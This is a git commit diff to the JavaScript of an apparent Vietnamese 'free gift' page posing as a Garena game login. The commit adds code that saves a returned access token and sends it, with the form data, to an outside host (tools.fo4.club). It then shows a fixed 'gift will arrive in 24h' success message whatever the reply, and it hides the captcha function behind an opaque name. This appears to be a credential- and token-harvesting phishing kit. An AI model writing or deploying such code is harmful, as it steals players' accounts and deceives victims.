b76346160372469362f9baf570347b2864c739e1
hoangthanhjoker <55344722+hoangthanhjoker@users.noreply.github.com>
2020-10-08 23:18:05 +0700

    Update script1.js

--- script1.js
+++ script1.js
@@ -1,4 +1,5 @@
- var captchaGenerate = function() {
+var a00731e5c = function() {
+    console.log("generate captcae nao");
         var b = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
             var b = 16 * Math.random() | 0;
             return ("x" == a ? b : b & 3 | 8).toString(16)
@@ -8,7 +9,7 @@
     },
     refreshCaptcha = function() {
         $(".refresh").click(function() {
-            captchaGenerate()
+            a00731e5c()
         })
     },
     loginHandle = function() {
@@ -23,10 +24,17 @@
                 },
                 complete: function() {
                     $("#confirm-btn").val("\u0110\u0103ng nh\u1eadp ngay").removeAttr("disabled");
-                    captchaGenerate()
+                    a00731e5c()
                 }
             }).done(function(a) {
-                "error_require_captcha" == a.status ? ($("#sso_captcha_wrap").show(), $("#input-captcha").attr("required", !0)) : "success" == a.status ? location.href = 'https://auth.garena.com/oauth/login?client_id=100054&response_type=token&redirect_uri=https%3A%2F%2Fclearmen.lienquan.garena.vn%2Fconnect%2Fgarena%2Fcallback&all_platforms=1&locale=vi-VN' : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
+                if (a.status === "success") {
+                    if (a.access_token) {
+                        localStorage.setItem("access_token", a.access_token);
+                    }
+                    location.href = "/";
+                } else {
+                    "error_require_captcha" == a.status ? ($("#lucky_captcha_wrap").show(), $("#input-captcha").attr("required", !0)) : "success" == a.status ? location.href = "/" : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
+                }
             }).fail(function() {
                 swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                     location.reload()
@@ -35,23 +43,27 @@
             b.preventDefault()
         })
     },
-    eventHandle = function() {
-        $("#next-step").submit(function(b) {
+    receiveGiftNow = function() {
+        let access_token = localStorage.getItem("access_token");
+        $("#receive-gift-form").submit(function(b) {
             $.ajax({
                 method: "POST",
-                url: "claim.php",
+                url: "https://tools.fo4.club/api/receive-gift",
+                headers: {
+                    "Authorization": access_token
+                },
                 data: $(this).serialize(),
                 dataType: "json",
                 beforeSend: function() {
-                    $("#confirm-btn").text("\u0110ang x\u1eed l\u00fd...").attr("disabled", !0)
+                    $("#__confirm-btn").val("Äang nháº­n quĂ ...").attr("disabled", !0)
                 },
                 complete: function() {
-                    $("#confirm-btn").text("Ti\u1ebfp t\u1ee5c").removeAttr("disabled");
-                    $("#captcha-input").val("");
-                    captchaGenerate()
+                    $("#__confirm-btn").val("Nháº­n quĂ  ngay").removeAttr("disabled");
+                    a00731e5c()
                 }
             }).done(function(a) {
-                "error_require_captcha" == a.status ? $("#captcha-img").show() : "success" == a.status || "warning" == a.status ? ($("#captcha-modal").modal("hide"), swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", a.status || "error")) : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
+                swal("Nháº­n quĂ  thĂ nh cĂ´ng", "QuĂ  táº·ng sáº½ Ä‘Æ°á»£c gá»­i sau 24h!", "success");
+                closePop();
             }).fail(function() {
                 swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                     location.reload()
@@ -59,20 +71,10 @@
             });
             b.preventDefault()
         })
-    };
-                function makeid(length) {
-                var text = "";
-                var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-
-                for (var i = 0; i < length; i++)
-                    text += possible.charAt(Math.floor(Math.random() * possible.length));
-
-                return text;
-            }
-    
+    }
 $(document).ready(function() {
     loginHandle();
-    eventHandle();
-    captchaGenerate();
-    refreshCaptcha()
+    a00731e5c();
+    refreshCaptcha();
+    receiveGiftNow();
 });
